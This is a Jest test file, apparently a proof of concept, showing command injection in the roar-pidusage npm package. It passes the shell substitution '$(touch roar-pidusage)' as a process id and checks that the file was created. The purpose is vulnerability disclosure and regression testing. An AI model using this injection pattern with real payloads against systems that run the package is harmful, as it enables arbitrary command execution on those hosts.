const v21 = done => {
    const v12 = expect.assertions(1);
    v12;
    const os = require('os');
    const v13 = () => {
        return 'freebsd';
    };
    os.platform = v13;
    const roar_pidusage = require('roar-pidusage');
    const fs = require('fs');
    const path = './roar-pidusage';
    const v19 = function () {
        file_exist = fs.existsSync(path);
        const v14 = expect(file_exist);
        const v15 = v14.toBe(true);
        v15;
        const v17 = function (err) {
            const v16 = done();
            v16;
        };
        const v18 = fs.unlink(path, v17);
        v18;
    };
    const v20 = roar_pidusage.stat('$(touch roar-pidusage)', v19);
    v20;
};
const v22 = test('Command Injection in roar-pidusage', v21);
v22;